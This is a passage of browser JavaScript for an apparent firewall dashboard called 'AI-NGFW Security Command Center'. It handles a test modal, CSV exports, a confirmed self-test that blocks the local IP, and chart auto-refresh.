        modal.setAttribute('aria-hidden', 'false');
    });
    closeBtn.addEventListener('click', () => {
        modal.classList.remove('open');
        modal.setAttribute('aria-hidden', 'true');
    });
    modal.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.classList.remove('open');
            modal.setAttribute('aria-hidden', 'true');
        }
    });

    modal.querySelector('.modal-sections').addEventListener('click', (e) => {
        const btn = e.target.closest('.btn-run');
        if (!btn) return;
        const row = btn.closest('.test-row');
        const url = btn.getAttribute('data-url');
        const resultEl = row && row.querySelector('.test-result[data-result]');
        runTest(url, resultEl, btn);
    });
}

checkAuthentication();
initTheme();
initTestModal();

const csvTraffic = document.getElementById('csvTraffic');
const csvIntrusion = document.getElementById('csvIntrusion');
const csvThreats = document.getElementById('csvThreats');
const csvAudit = document.getElementById('csvAudit');
if (csvTraffic) csvTraffic.addEventListener('click', downloadTrafficCsv);
if (csvIntrusion) csvIntrusion.addEventListener('click', downloadIntrusionCsv);
if (csvThreats) csvThreats.addEventListener('click', downloadThreatsCsv);
if (csvAudit) csvAudit.addEventListener('click', downloadAuditCsv);

const testBlockBtn = document.getElementById('testBlockBtn');
if (testBlockBtn) {
    testBlockBtn.addEventListener('click', async function () {
        if (!confirm('This will block your IP (127.0.0.1). You will see a 403 page after reload. Use "Unblock my IP" on that page to recover. Continue?')) return;
        this.disabled = true;
        try {
            const r = await fetch(`${API_BASE}/api/blocked-ips`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip: '127.0.0.1', reason: 'Test block' }),
                credentials: 'same-origin'
            });
            const d = await r.json();
            if (d.success) {
                alert('Your IP is now blocked. Reloading... You will see the block page. Click "Unblock my IP" there to unblock.');
                window.location.reload();
            } else {
                alert('Failed: ' + (d.error || 'Unknown'));
                this.disabled = false;
            }
        } catch (e) {
            alert('Error: ' + e.message);
            this.disabled = false;
        }
    });
}

initializeCharts();
refreshDashboard();
setInterval(refreshDashboard, REFRESH_INTERVAL);

console.log('[AI-NGFW] Security Command Center loaded');
console.log('[AI-NGFW] Auto-refresh:', REFRESH_INTERVAL / 1000, 'seconds');
